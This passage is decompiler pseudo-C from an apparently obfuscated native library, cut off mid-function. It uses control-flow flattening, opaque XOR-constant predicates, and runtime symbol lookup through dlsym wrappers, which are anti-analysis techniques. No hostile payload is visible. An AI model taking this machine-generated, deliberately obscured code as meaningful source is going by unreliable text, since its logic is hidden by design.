// ---- 0002ef24  FUN_0002ef24  size=3360

undefined4 FUN_0002ef24(undefined4 param_1,undefined4 param_2)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  int iVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  int iVar9;
  bool bVar10;
  bool bVar11;
  int local_a8;
  undefined4 local_a0 [2];
  undefined4 local_98 [2];
  undefined4 local_90 [2];
  undefined4 local_88 [2];
  char local_80 [8];
  int local_78 [2];
  char local_70 [8];
  int local_68 [2];
  char local_60 [8];
  uint local_58 [2];
  uint *local_50;
  undefined4 *local_4c;
  undefined4 *local_48;
  char *local_44;
  char *local_40;
  int *local_3c;
  char *local_38;
  undefined4 *local_34;
  undefined4 *local_30;
  int *local_2c;
  
  iVar1 = DAT_0002fc74;
  local_50 = local_58;
  local_38 = local_60;
  local_3c = local_68;
  local_40 = local_70;
  local_2c = local_78;
  local_44 = local_80;
  local_48 = local_88;
  local_34 = local_90;
  local_4c = local_98;
  local_30 = local_a0;
  local_58[0] = *(uint *)(DAT_0002fedc + 0x2efc4) ^ DAT_0002fc44;
  local_a8 = DAT_0002fc48;
  iVar7 = DAT_0002fc48;
  iVar9 = DAT_0002fcb8;
  iVar4 = local_a8;
LAB_0002eff4:
  do {
    while (local_a8 = iVar4, local_a8 == iVar1) {
      uVar8 = *(uint *)(DAT_0002ff04 + 0x2f734) ^ DAT_0002fe4c;
      uVar8 = (DAT_0002fc64 ^ DAT_0002fc64 + 2) *
              (uVar8 & (*(uint *)(DAT_0002ff00 + 0x2f724) ^ DAT_0002fe48)) -
              (*(uint *)(DAT_0002ff00 + 0x2f724) ^ uVar8 ^ DAT_0002fe50);
      uVar6 = uVar8 ^ DAT_0002fe5c;
      uVar8 = (uVar6 | DAT_0002fe58) * (uVar6 & DAT_0002fe58) +
              (uVar6 & DAT_0002fe60) * ((uVar8 ^ DAT_0002fe54) & DAT_0002fe58) + DAT_0002fe64;
      bVar11 = DAT_0002fe68 <= uVar8;
      bVar10 = uVar8 == DAT_0002fe68;
      iVar4 = DAT_0002fcb8;
      iVar9 = DAT_0002fcb8;
LAB_0002fb94:
      if (bVar11 && !bVar10) {
        iVar4 = -0x678f60c7;
      }
    }
    if (local_a8 == DAT_0002fc78) {
      local_a8 = DAT_0002fc98;
      iVar4 = local_a8;
      goto LAB_0002eff4;
    }
    iVar4 = iVar9;
    if (local_a8 != DAT_0002fc7c) {
      if (local_a8 == DAT_0002fc80) {
        local_a8 = DAT_0002fd08;
        iVar4 = local_a8;
      }
      else if (local_a8 == DAT_0002fc84) {
        iVar4 = DAT_0002fce4;
        if (*local_44 != '\0') {
          iVar4 = 0x3dc03c5a;
        }
      }
      else if (local_a8 == DAT_0002fc88) {
        *local_44 = *local_2c == 0;
        uVar8 = *(uint *)(DAT_0002ff1c + 0x2fac4) ^ DAT_0002fe08;
        uVar6 = *(uint *)(DAT_0002ff20 + 0x2fad0) ^ DAT_0002fe0c;
        uVar8 = (uVar6 + uVar8) - (DAT_0002fc68 + 2 ^ DAT_0002fc68) * (uVar6 & uVar8);
        uVar8 = FUN_00035060(~((uVar8 | DAT_0002fe10) & (~uVar8 | 0xffb7ffef)),DAT_0002fe14);
        iVar4 = DAT_0002fc8c;
        if (DAT_0002fe18 < uVar8) {
          iVar4 = -0x5391b5f0;
        }
      }
      else if (local_a8 == DAT_0002fc8c) {
        local_a8 = DAT_0002fca0;
        iVar4 = local_a8;
      }
      else if (local_a8 == DAT_0002fc90) {
        (*(code *)*local_2c)(param_1,param_2,DAT_0002ff7c + 0x2fa0c);
LAB_0002fa0c:
        local_a8 = DAT_0002fd18;
        iVar4 = local_a8;
      }
      else {
        puVar3 = local_4c;
        if (local_a8 == DAT_0002fc94) {
LAB_0002f700:
          local_a8 = DAT_0002fd1c;
          *local_30 = *puVar3;
          iVar4 = local_a8;
        }
        else if (local_a8 == DAT_0002fc98) {
          *local_34 = *(undefined4 *)(DAT_0002ff50 + 0x2f5c4);
          uVar8 = FUN_00035060(*(uint *)(DAT_0002ff54 + 0x2f5d4) ^ DAT_0002fd7c,
                               *(uint *)(DAT_0002ff58 + 0x2f5e0) ^ DAT_0002fd80);
          iVar4 = DAT_0002fcc0;
          if (DAT_0002fd8c < ((uVar8 ^ DAT_0002fd84) & uVar8 ^ DAT_0002fd88)) {
            iVar4 = -0x703043b6;
          }
        }
        else if (local_a8 == DAT_0002fc9c) {
          local_a8 = DAT_0002fcdc;
          iVar4 = local_a8;
        }
        else if (local_a8 == DAT_0002fca0) {
          iVar4 = DAT_0002fd08;
          if ((((*(uint *)(DAT_0002ff28 + 0x2f9c0) ^ DAT_0002fdf4) -
               (*(uint *)(DAT_0002ff24 + 0x2f9b4) ^ DAT_0002fdf0)) * DAT_0002fdfc + DAT_0002fdf8 |
              DAT_0002fe00) < DAT_0002fe04) {
            iVar4 = -0x5a9ed85c;
          }
        }
        else if (local_a8 == DAT_0002fca4) {
          local_a8 = DAT_0002fcd0;
          iVar4 = local_a8;
        }
        else if (local_a8 == DAT_0002fca8) {
          *local_30 = 0;
          iVar4 = DAT_0002fd1c;
          if (*local_40 != '\0') {
            iVar4 = -0x71d8a655;
          }
        }
        else if (local_a8 == DAT_0002fcac) {
          uVar8 = *(uint *)(DAT_0002ff70 + 0x2fbd0) ^ DAT_0002fd40 |
                  *(uint *)(DAT_0002ff6c + 0x2fbc4) ^ DAT_0002fd3c | DAT_0002fd44;
          iVar4 = DAT_0002fd14;
          if (((uVar8 + (uVar8 ^ DAT_0002fd48)) - (uVar8 & DAT_0002fd4c)) +
              (DAT_0002fc50 + 1 ^ DAT_0002fc50) == DAT_0002fd50) {
            iVar4 = 0x37e0d82c;
          }
        }
        else if (local_a8 == DAT_0002fcb0) {
          local_a8 = DAT_0002fc88;
          iVar4 = local_a8;
        }
        else if (local_a8 == DAT_0002fcb4) {
          local_a8 = DAT_0002fcd8;
          iVar4 = local_a8;
        }
        else {
          if (local_a8 == iVar9) {
            *local_2c = *(int *)(DAT_0002ff08 + 0x2fb38);
            uVar8 = (*(uint *)(DAT_0002ff10 + 0x2fb5c) ^ DAT_0002fe34) -
                    (*(uint *)(DAT_0002ff0c + 0x2fb50) ^ DAT_0002fe30);
            uVar8 = FUN_00035060((uVar8 & DAT_0002fe38) * (DAT_0002fc58 + 2 ^ DAT_0002fc58) +
                                 (uVar8 ^ DAT_0002fe38),DAT_0002fe3c);
            bVar11 = DAT_0002fe44 <= (uVar8 | DAT_0002fe40);
            bVar10 = (uVar8 | DAT_0002fe40) == DAT_0002fe44;
            iVar4 = DAT_0002fd04;
            goto LAB_0002fb94;
          }
          if (local_a8 == DAT_0002fcbc) {
            (*(code *)*local_34)(param_1,param_2);
            local_a8 = DAT_0002fccc;
            iVar4 = local_a8;
          }
          else if (local_a8 == DAT_0002fcc0) {
            local_a8 = DAT_0002fcfc;
            iVar4 = local_a8;
          }
          else if (local_a8 == DAT_0002fcc4) {
            local_a8 = DAT_0002fcac;
            iVar4 = local_a8;
          }
          else if (local_a8 == DAT_0002fcc8) {
            uVar8 = FUN_00035060(*(uint *)(DAT_0002ff14 + 0x2f340) ^ DAT_0002fe1c,
                                 *(uint *)(DAT_0002ff18 + 0x2f34c) ^ DAT_0002fe20);
            iVar4 = DAT_0002fc88;
            if ((uVar8 ^ DAT_0002fe24 | DAT_0002fe28) == DAT_0002fe2c) {
              iVar4 = -0x1c7510e8;
            }
          }
          else if (local_a8 == DAT_0002fccc) {
            uVar6 = *(uint *)(DAT_0002ff64 + 0x2f268);
            uVar8 = *(uint *)(DAT_0002ff68 + 0x2f270);
            uVar2 = (*(code *)*local_34)(param_1,param_2);
            *local_4c = uVar2;
            uVar8 = uVar8 ^ DAT_0002fd54;
            uVar6 = uVar6 ^ DAT_0002fd58;
            uVar8 = (uVar6 & uVar8) + (uVar6 | uVar8);
            uVar8 = (uVar8 | DAT_0002fd60) * (uVar8 & DAT_0002fd60) +
                    (DAT_0002fd60 & ~uVar8) * (uVar8 & DAT_0002fd5c);
            bVar10 = (DAT_0002fd68 & ~uVar8 | uVar8 & DAT_0002fd64) == DAT_0002fd6c;
            iVar4 = DAT_0002fcc4;
            iVar7 = DAT_0002fc48;
            iVar9 = DAT_0002fcb8;
LAB_0002f7e0:
            if (bVar10) {
              iVar4 = -0x576de16;
            }
          }
          else if (local_a8 == DAT_0002fcd0) {
            uVar8 = *(uint *)(DAT_0002ff44 + 0x2f88c) ^ DAT_0002fda8 |
                    *(uint *)(DAT_0002ff40 + 0x2f880) ^ DAT_0002fda4;
            uVar8 = (~uVar8 | DAT_0002fdac) + uVar8 + (DAT_0002fc70 ^ DAT_0002fc70 + 1) |
                    DAT_0002fdb0;
            iVar4 = DAT_0002fce0;
            if (uVar8 + (DAT_0002fc5c + 1 ^ DAT_0002fc5c) + (~uVar8 | DAT_0002fdb4) != DAT_0002fdb8)
            {
              iVar4 = -0x1ba8a2a8;
            }
          }
          else if (local_a8 == DAT_0002fcd4) {
            iVar4 = iVar1;
            if (*local_38 != '\0') {
              iVar4 = 0x4d360a1c;
            }
          }
          else {
            puVar3 = local_48;
            if (local_a8 == DAT_0002fcd8) goto LAB_0002f700;
            if (local_a8 == iVar7) {
              local_a8 = DAT_0002fcd4;
              *local_38 = (int)*local_50 < (int)(DAT_0002fc6c + 1 ^ DAT_0002fc6c);
              iVar4 = local_a8;
            }
            else if (local_a8 == DAT_0002fcdc) {
              uVar8 = FUN_00035060((*(uint *)(DAT_0002fef4 + 0x2f3d8) ^ DAT_0002fe80) -
                                   (*(uint *)(DAT_0002fef0 + 0x2f3cc) ^ DAT_0002fe7c),DAT_0002fe84);
              uVar8 = (uVar8 | DAT_0002fe88) * (uVar8 & 3) + (DAT_0002fe88 & ~uVar8) * (uVar8 & 4);
              iVar4 = DAT_0002fd0c;
              if (DAT_0002fe9c <
                  ((DAT_0002fe90 & ~uVar8 | uVar8 & DAT_0002fe8c) ^ DAT_0002fe94 |
                  uVar8 & DAT_0002fe98)) {
                iVar4 = 0x6e08a538;
              }
            }
            else if (local_a8 == DAT_0002fce0) {
              local_a8 = DAT_0002fcb4;
              iVar4 = local_a8;
            }
            else {
              if (local_a8 == DAT_0002fce4) goto LAB_0002fa0c;
              if (local_a8 == DAT_0002fce8) {
                uVar6 = *(uint *)(DAT_0002fee8 + 0x2f924);
                uVar8 = *(uint *)(DAT_0002feec + 0x2f92c);
                iVar4 = FUN_00028080();
                iVar9 = DAT_0002fcb8;
                iVar7 = DAT_0002fc48;
                *local_3c = iVar4;
                uVar8 = uVar8 ^ DAT_0002fea0;
                uVar6 = uVar6 ^ DAT_0002fea4;
                uVar2 = FUN_00035060((~(uVar6 * uVar8) | DAT_0002fea8) +
                                     uVar6 * uVar8 + (DAT_0002fc60 + 1 ^ DAT_0002fc60),DAT_0002feac)
                ;
                iVar5 = FUN_00035060(uVar2,DAT_0002feb0);
                iVar4 = DAT_0002fc9c;
                if (iVar5 == DAT_0002feb4) {
                  iVar4 = 0x3b53c854;
                }
              }
              else if (local_a8 == DAT_0002fcec) {
                local_a8 = DAT_0002fd14;
                iVar4 = local_a8;
              }
              else if (local_a8 == DAT_0002fcf0) {
                FUN_00028080();
                local_a8 = DAT_0002fce8;
                iVar4 = local_a8;
              }
              else if (local_a8 == DAT_0002fcf4) {
                uVar8 = FUN_00035060(*(uint *)(DAT_0002ff48 + 0x2f624) ^ DAT_0002fd90,
                                     *(uint *)(DAT_0002ff4c + 0x2f630) ^ DAT_0002fd94);
                iVar4 = DAT_0002fc78;
                if (~(DAT_0002fd98 & ~uVar8) + (DAT_0002fc4c ^ DAT_0002fc4c + 1) +
                    (DAT_0002fd98 & ~uVar8 | DAT_0002fd9c) != DAT_0002fda0) {
                  iVar4 = -0x37d168d9;
                }
              }
              else if (local_a8 == DAT_0002fcf8) {
                uVar8 = (*(uint *)(DAT_0002fee4 + 0x2f80c) ^ DAT_0002febc) +
                        (*(uint *)(DAT_0002fee0 + 0x2f800) ^ DAT_0002feb8);
                iVar4 = DAT_0002fcf0;
                if (DAT_0002fed8 <
                    ((DAT_0002fec4 & ~uVar8 | uVar8 & DAT_0002fec0) ^ DAT_0002fec8 |
                    uVar8 & DAT_0002fecc) * DAT_0002fed4 + DAT_0002fed0) {
                  iVar4 = 0x3363bc47;
                }
              }
              else {
                if (local_a8 == DAT_0002fcfc) {
                  bVar10 = (*(uint *)(DAT_0002ff60 + 0x2f7d0) ^ DAT_0002fd74) *
                           (*(uint *)(DAT_0002ff5c + 0x2f7c4) ^ DAT_0002fd70) - DAT_0002fd78 == 0;
                  iVar4 = DAT_0002fccc;
                  goto LAB_0002f7e0;
                }
                if (local_a8 == DAT_0002fd00) {
                  local_a8 = DAT_0002fca8;
                  iVar4 = local_a8;
                }
                else if (local_a8 == DAT_0002fd04) {
                  local_a8 = DAT_0002fcc8;
                  iVar4 = local_a8;
                }
                else if (local_a8 == DAT_0002fd08) {
                  uVar8 = FUN_00035060(((*(uint *)(DAT_0002ff30 + 0x2f4cc) ^ DAT_0002fdd8) &
                                       (*(uint *)(DAT_0002ff2c + 0x2f4c0) ^ DAT_0002fdd4)) +
                                       DAT_0002fddc,DAT_0002fde0);
                  iVar4 = DAT_0002fc80;
                  if (((uVar8 | DAT_0002fde4) & (~uVar8 | DAT_0002fde8)) != DAT_0002fdec) {
                    iVar4 = -0x5741c067;
                  }
                }
                else if (local_a8 == DAT_0002fd0c) {
                  local_a8 = DAT_0002fd10;
                  iVar4 = local_a8;
                }
                else if (local_a8 == DAT_0002fd10) {
                  *local_40 = *local_3c == 0;
                  iVar4 = DAT_0002fd00;
                  if ((*(uint *)(DAT_0002fefc + 0x2f488) ^ DAT_0002fe70 |
                      *(uint *)(DAT_0002fef8 + 0x2f47c) ^ DAT_0002fe6c) + DAT_0002fe74 <
                      DAT_0002fe78) {
                    iVar4 = 0x6cffe572;
                  }
                }
                else if (local_a8 == DAT_0002fd14) {
                  uVar8 = (((*(uint *)(DAT_0002ff78 + 0x2f698) ^ DAT_0002fd24) *
                            (*(uint *)(DAT_0002ff74 + 0x2f688) ^ DAT_0002fd20) & DAT_0002fd28) -
                          (DAT_0002fc54 ^ DAT_0002fc54 + 1)) + DAT_0002fd2c;
                  iVar4 = DAT_0002fcec;
                  if (DAT_0002fd38 <
                      (uVar8 | DAT_0002fd34) * (uVar8 & DAT_0002fd34) +
                      (DAT_0002fd34 & ~uVar8) * (uVar8 & DAT_0002fd30)) {
                    iVar4 = -0x3fa0f992;
                  }
                }
                else if (local_a8 == DAT_0002fd18) {
                  uVar6 = *(uint *)(DAT_0002ff34 + 0x2f53c);
                  uVar8 = *(uint *)(DAT_0002ff38 + 0x2f544);
                  uVar2 = (*(code *)*local_2c)(param_1,param_2,DAT_0002ff3c + 0x2f54c);
                  *local_48 = uVar2;
                  uVar8 = uVar8 ^ DAT_0002fdbc;
                  uVar6 = uVar6 ^ DAT_0002fdc0;
                  uVar8 = (uVar6 | uVar8) & ~(uVar6 & uVar8);
                  iVar7 = DAT_0002fc48;
                  iVar9 = DAT_0002fcb8;
                  iVar4 = DAT_0002fc90;
                  if (DAT_0002fdd0 <
                      (((uVar8 ^ DAT_0002fdc4) & uVar8) + DAT_0002fdc8 ^ DAT_0002fdcc)) {
                    iVar4 = -0x2404af19;
                  }
                }
                else {
                  iVar4 = local_a8;
                  if (local_a8 == DAT_0002fd1c) {
                    return *local_30;
                  }
                }
              }
            }
          }
        }
      }
    }
  } while( true );
}



// ---- 0002ff80  FUN_0002ff80  size=500

undefined4 FUN_0002ff80(undefined4 param_1,undefined4 param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined4 uVar4;
  uint uVar5;
  uint uVar6;
  int iVar7;
  int iVar8;
  int local_50;
  undefined4 local_48 [2];
  uint local_40 [2];
  uint *local_38;
  undefined4 *local_34;
  undefined4 local_30;
  undefined4 local_2c;
  
  iVar3 = DAT_000301a8;
  iVar2 = DAT_000301a4;
  iVar1 = DAT_00030194;
  local_38 = local_40;
  local_34 = local_48;
  uVar5 = (*(uint *)(DAT_000301cc + 0x2ffd0) ^ DAT_00030178) +
          (*(uint *)(DAT_000301c8 + 0x2ffc0) ^ DAT_00030174) + DAT_0003017c;
  local_40[0] = ((DAT_00030184 & ~uVar5 | uVar5 & DAT_00030180) ^ DAT_00030188 |
                uVar5 & DAT_0003018c) + DAT_00030190;
  local_50 = DAT_00030194;
  iVar7 = DAT_0003019c;
  iVar8 = DAT_000301a0;
  local_30 = param_1;
  local_2c = param_2;
  do {
    while( true ) {
      while( true ) {
        while( true ) {
          while (local_50 == iVar7) {
            dlsym(local_30,local_2c);
            local_50 = iVar8;
          }
          if (local_50 != iVar8) break;
          uVar6 = *(uint *)(DAT_000301d0 + 0x3008c);
          uVar5 = *(uint *)(DAT_000301d4 + 0x30094);
          uVar4 = dlsym(local_30,local_2c);
          *local_34 = uVar4;
          uVar5 = (~((uVar6 ^ DAT_000301b0) & (uVar5 ^ DAT_000301ac)) -
                  (DAT_00030198 + 1 ^ DAT_00030198)) + DAT_000301b4;
          iVar7 = DAT_0003019c;
          iVar8 = DAT_000301a0;
          local_50 = iVar2;
          if (DAT_000301c0 < ((~uVar5 | DAT_000301bc) & (uVar5 | DAT_000301b8))) {
            local_50 = 0x3d0abe28;
          }
        }
        if (local_50 != iVar1) break;
        local_50 = iVar7;
        if (*local_38 < DAT_000301c4) {
          local_50 = 0x3d0abe28;
        }
      }
      if (local_50 != iVar2) break;
      local_50 = iVar3;
    }
  } while (local_50 != iVar3);
  return *local_34;
}



// ---- 000301d8  FUN_000301d8  size=388

undefined4 FUN_000301d8(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  uint uVar6;
  int local_40;
  undefined4 local_38 [2];
  undefined4 uStack_30;
  undefined4 *local_2c;
  undefined4 uStack_28;
  
  local_2c = local_38;
  uStack_30 = param_2;
  uStack_28 = param_4;
  local_38[0] = dlerror();
  iVar5 = DAT_0003036c;
  iVar4 = DAT_00030368;
  uVar3 = DAT_00030364;
  uVar2 = DAT_00030360;
  iVar1 = DAT_0003035c;
  local_40 = DAT_0003035c;
  do {
    while( true ) {
      while( true ) {
        while (local_40 == iVar4) {
          uVar6 = (*(uint *)(DAT_000303bc + 0x302d8) ^ DAT_00030380) &
                  (*(uint *)(DAT_000303b8 + 0x302cc) ^ DAT_0003037c) |
                  (*(uint *)(DAT_000303bc + 0x302d8) ^ DAT_00030378) &
                  (*(uint *)(DAT_000303b8 + 0x302cc) ^ DAT_00030374);
          local_40 = iVar4;
          if (DAT_00030394 <
              (((uVar6 & DAT_00030384) - (uVar3 + 2 ^ uVar3) * (uVar6 & DAT_00030388)) +
               DAT_0003038c | DAT_00030390)) {
            local_40 = -0x1a46f78a;
          }
        }
        if (local_40 != iVar1) break;
        uVar6 = FUN_00035060(*(uint *)(DAT_000303b0 + 0x3026c) ^ DAT_00030398,
                             *(uint *)(DAT_000303b4 + 0x30278) ^ DAT_0003039c);
        local_40 = iVar5;
        if (((uVar6 | DAT_000303a0) + (uVar2 ^ uVar2 + 1) + DAT_000303a4 | DAT_000303a8) !=
            DAT_000303ac) {
          local_40 = -0x2ea7e5ca;
        }
      }
      if (local_40 != iVar5) break;
      local_40 = iVar4;
    }
  } while (local_40 != DAT_00030370);
  return *local_2c;
}



// ---- 000303c4  FUN_000303c4  size=344

void FUN_000303c4(void)

{
  uint uVar1;
  uint uVar2;
  int local_38;
  
  uVar1 = FUN_00035060(*(uint *)(DAT_00030564 + 0x303e8) ^ DAT_0003051c,
                       *(uint *)(DAT_00030568 + 0x303f8) ^ DAT_00030520);
  uVar1 = FUN_00035060(((uVar1 ^ 0x32c100) & DAT_0003052c | (uVar1 ^ DAT_00030524) & DAT_00030528) ^
                       DAT_00030530,DAT_00030534);
  local_38 = DAT_00030538;
  do {
    while( true ) {
      while( true ) {
        while (local_38 == DAT_0003053c) {
          uVar2 = ((*(uint *)(DAT_00030570 + 0x304cc) ^ DAT_0003054c) -
                  (*(uint *)(DAT_0003056c + 0x304c0) ^ DAT_00030548)) + DAT_00030550;
          local_38 = DAT_00030544;
          if (((uVar2 ^ DAT_00030554) & uVar2 | DAT_00030558) == DAT_0003055c) {
            local_38 = 0x568f705;
          }
        }
        if (local_38 != DAT_00030538) break;
        local_38 = DAT_0003053c;
        if (DAT_00030560 < uVar1) {
          local_38 = 0x2e466adf;
        }
      }
      if (local_38 != DAT_00030540) break;
      local_38 = DAT_0003053c;
    }
  } while (local_38 != DAT_00030544);
  return;
}



// ---- 00030574  FUN_00030574  size=396

void FUN_00030574(void)

{
  uint uVar1;
  uint uVar2;
  undefined4 local_38;
  
  uVar1 = (~(*(uint *)(DAT_00030750 + 0x305b0) ^ DAT_00030704 |
            *(uint *)(DAT_0003074c + 0x30598) ^ 0xc491000) |
           (*(uint *)(DAT_00030750 + 0x305b0) ^ DAT_00030700) &
           (*(uint *)(DAT_0003074c + 0x30598) ^ 0x91002540) | DAT_00030708) + DAT_0003070c;
  local_38 = DAT_00030720;
  do {
    while( true ) {
      while( true ) {
        while (local_38 == DAT_00030720) {
          local_38 = DAT_00030728;
          if (DAT_00030748 <
              ((DAT_00030714 & ~uVar1 | uVar1 & DAT_00030710) ^ DAT_00030718 | uVar1 & DAT_0003071c)
             ) {
            local_38 = -0x26a44550;
          }
        }
        if (local_38 != DAT_00030724) break;
        uVar2 = (*(uint *)(DAT_00030758 + 0x30684) ^ DAT_00030734 |
                *(uint *)(DAT_00030754 + 0x30674) ^ DAT_00030730) + DAT_00030738;
        local_38 = DAT_0003072c;
        if ((uVar2 | DAT_00030740) * (uVar2 & DAT_00030740) +
            (DAT_00030740 & ~uVar2) * (uVar2 & DAT_0003073c) == DAT_00030744) {
          local_38 = -0x26a44550;
        }
      }
      if (local_38 != DAT_00030728) break;
      local_38 = DAT_00030724;
    }
  } while (local_38 != DAT_0003072c);
  return;
}



// ---- 0003075c  FUN_0003075c  size=344

void FUN_0003075c(void)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  uint uVar7;
  int local_38;
  
  iVar4 = DAT_000308d8;
  iVar3 = DAT_000308d4;
  iVar2 = DAT_000308d0;
  iVar1 = DAT_000308cc;
  uVar7 = ~((*(uint *)(DAT_00030900 + 0x30790) ^ DAT_000308c0 |
            *(uint *)(DAT_000308fc + 0x30784) ^ DAT_000308bc) &
           (*(uint *)(DAT_00030900 + 0x30790) ^ DAT_000308b8 |
           *(uint *)(DAT_000308fc + 0x30784) ^ DAT_000308b4)) + DAT_000308c4 & DAT_000308c8;
  local_38 = DAT_000308cc;
  do {
    while( true ) {
      while( true ) {
        while (local_38 == iVar2) {
          uVar5 = (*(uint *)(DAT_00030908 + 0x30848) ^ DAT_000308e0) -
                  (*(uint *)(DAT_00030904 + 0x3083c) ^ DAT_000308dc);
          iVar6 = FUN_00035060((uVar5 | DAT_000308e8) & (uVar5 ^ DAT_000308e4) & DAT_000308ec,
                               DAT_000308f0);
          local_38 = iVar4;
          if (iVar6 == DAT_000308f4) {
            local_38 = 0x112a64cb;
          }
        }
        if (local_38 != iVar3) break;
        local_38 = iVar2;
      }
      if (local_38 != iVar1) break;
      local_38 = iVar3;
      if (uVar7 < DAT_000308f8) {
        local_38 = 0x27f6ab4;
      }
    }
  } while (local_38 != iVar4);
  return;
}



// ---- 0003090c  FUN_0003090c  size=3044

undefined4 FUN_0003090c(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  undefined4 uVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  bool bVar11;
  int local_98;
  undefined4 local_90 [2];
  undefined4 local_88 [2];
  undefined4 local_80 [2];
  undefined4 local_78 [2];
  char local_70 [8];
  int local_68 [2];
  uint local_60 [3];
  uint *local_54;
  undefined4 *local_50;
  undefined4 local_4c;
  undefined4 *local_48;
  char *local_44;
  undefined4 local_40;
  undefined4 uStack_3c;
  undefined4 uStack_38;
  undefined4 *local_34;
  undefined4 *local_30;
  int *local_2c;
  
  local_54 = local_60;
  local_2c = local_68;
  local_44 = local_70;
  local_30 = local_78;
  local_48 = local_80;
  local_34 = local_88;
  local_50 = local_90;
  uVar3 = *(uint *)(DAT_00031760 + 0x30998) ^ DAT_000314f4 |
          *(uint *)(DAT_0003175c + 0x30988) ^ DAT_000314f0;
  uVar3 = ((uVar3 | DAT_000314fc) & (uVar3 ^ DAT_000314f8)) * DAT_00031500;
  local_60[0] = (uVar3 | DAT_00031508) & (uVar3 ^ DAT_00031504);
  local_98 = DAT_0003150c;
  iVar5 = DAT_0003154c;
  iVar7 = DAT_0003152c;
  iVar8 = DAT_00031550;
  iVar9 = DAT_0003156c;
  iVar10 = DAT_00031558;
  iVar2 = local_98;
  local_4c = param_4;
  local_40 = param_1;
  uStack_3c = param_2;
  uStack_38 = param_3;
LAB_00030a10:
  do {
    while( true ) {
      while( true ) {
        while( true ) {
          while( true ) {
            while( true ) {
              while( true ) {
                while( true ) {
                  while( true ) {
                    while( true ) {
                      while( true ) {
                        do {
                          while( true ) {
                            while( true ) {
                              while( true ) {
                                while( true ) {
                                  while( true ) {
                                    while( true ) {
                                      while (local_98 = iVar2, uVar3 = DAT_000316ac,
                                            local_98 == iVar7) {
                                        *local_2c = *(int *)(DAT_00031764 + 0x30f10);
                                        uVar3 = *(uint *)(DAT_0003176c + 0x30f24) ^
                                                *(uint *)(DAT_00031768 + 0x30f1c) ^ 0x72000004;
                                        iVar2 = DAT_00031584;
                                        if (DAT_00031754 <
                                            ((uVar3 & DAT_0003174c) -
                                            (DAT_00031520 + 2 ^ DAT_00031520) * (uVar3 & 0x32000000)
                                            ) + DAT_00031750) {
                                          iVar2 = -0x56518dc9;
                                        }
                                      }
                                      if (local_98 != DAT_00031530) break;
                                      uVar3 = ((*(uint *)(DAT_00031784 + 0x31214) ^ DAT_000316f4) +
                                              (*(uint *)(DAT_00031780 + 0x31208) ^ DAT_000316f0)) *
                                              DAT_000316f8;
                                      iVar2 = DAT_00031568;
                                      if (((DAT_00031700 & ~uVar3 | uVar3 & DAT_000316fc) ^
                                           DAT_00031704 | uVar3 & 0xd0018800) < DAT_00031708) {
                                        iVar2 = 0x33594021;
                                      }
                                    }
                                    if (local_98 != DAT_00031534) break;
                                    uVar3 = (*(uint *)(DAT_00031794 + 0x30fa4) ^ DAT_000316c0) *
                                            (*(uint *)(DAT_00031790 + 0x30f90) ^ DAT_000316bc);
                                    uVar3 = (uVar3 | DAT_000316c8) * (uVar3 & DAT_000316c8) +
                                            (DAT_000316c8 & ~uVar3) * (uVar3 & DAT_000316c4) +
                                            DAT_000316cc;
                                    iVar5 = DAT_0003154c;
                                    iVar7 = DAT_0003152c;
                                    iVar2 = DAT_0003155c;
                                    if (DAT_000316d4 <
                                        (uVar3 - (DAT_00031528 + 2 ^ DAT_00031528) *
                                                 (uVar3 & DAT_000316d0)) + DAT_000316d0) {
                                      iVar2 = 0x74f352af;
                                    }
                                  }
                                  if (local_98 != DAT_00031538) break;
                                  uVar3 = (*(uint *)(DAT_000317ac + 0x3148c) ^ DAT_0003165c) +
                                          (*(uint *)(DAT_000317a8 + 0x31480) ^ DAT_00031658);
                                  iVar2 = DAT_00031538;
                                  if ((((~uVar3 | DAT_00031664) & DAT_00031668 |
                                       uVar3 & DAT_00031660) ^ DAT_0003166c) + DAT_00031670 <
                                      DAT_00031674) {
                                    iVar2 = 0x584f6b4a;
                                  }
                                }
                                if (local_98 != DAT_0003153c) break;
                                local_98 = DAT_00031588;
                                iVar2 = local_98;
                              }
                              if (local_98 != DAT_00031540) break;
                              local_98 = DAT_00031534;
                              iVar2 = local_98;
                            }
                            if (local_98 != DAT_00031544) break;
                            local_98 = DAT_00031554;
                            iVar2 = local_98;
                          }
                          iVar2 = iVar7;
                        } while (local_98 == DAT_00031548);
                        if (local_98 != iVar5) break;
                        uVar3 = *(uint *)(DAT_000317c8 + 0x30d3c) ^ DAT_000315e4;
                        uVar4 = *(uint *)(DAT_000317cc + 0x30d6c) ^ DAT_000315f0;
                        uVar3 = (uVar4 & DAT_000315e8 |
                                (*(uint *)(DAT_000317cc + 0x30d6c) ^ DAT_000315ec) & DAT_000315e0) ^
                                (uVar3 & DAT_000315e8 |
                                (*(uint *)(DAT_000317c8 + 0x30d3c) ^ DAT_000315dc) & DAT_000315e0) |
                                ~(uVar4 | uVar3);
                        iVar5 = DAT_0003154c;
                        iVar8 = DAT_00031550;
                        iVar9 = DAT_0003156c;
                        iVar10 = DAT_00031558;
                        iVar2 = DAT_00031598;
                        if (DAT_000315fc +
                            ((uVar3 | 0xf4430) & DAT_000315f8) + (uVar3 | DAT_000315f4) == 0) {
                          iVar2 = -0x2f66469d;
                        }
                      }
                      if (local_98 != iVar8) break;
                      uVar3 = ((*(uint *)(DAT_000317a4 + 0x30e18) ^ DAT_00031684) &
                              (*(uint *)(DAT_000317a0 + 0x30e04) ^ DAT_00031680)) -
                              ((*(uint *)(DAT_000317a4 + 0x30e18) ^ DAT_0003167c) &
                              (*(uint *)(DAT_000317a0 + 0x30e04) ^ DAT_00031678));
                      uVar3 = (uVar3 | DAT_00031688) * (uVar3 & DAT_00031688) +
                              (uVar3 & DAT_0003168c) * (DAT_00031688 & ~uVar3);
                      uVar4 = uVar3 & DAT_00031690;
                      iVar5 = DAT_0003154c;
                      iVar9 = DAT_0003156c;
                      iVar10 = DAT_00031558;
                      iVar2 = DAT_00031558;
